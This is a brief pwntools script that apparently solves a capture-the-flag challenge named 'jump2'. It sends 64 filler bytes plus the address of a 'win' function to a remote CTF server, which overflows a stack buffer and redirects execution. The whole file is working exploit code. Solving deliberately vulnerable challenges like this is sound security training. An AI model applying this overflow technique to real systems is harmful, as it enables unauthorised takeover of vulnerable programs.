from pwn import *

p = process('./dist/jump2')
elf = p.elf
p = remote('cbactf.com', 5002)

print(hex(elf.symbols['win']))
p.sendline(64 * b'A' + p32(elf.symbols['win']))
p.interactive()
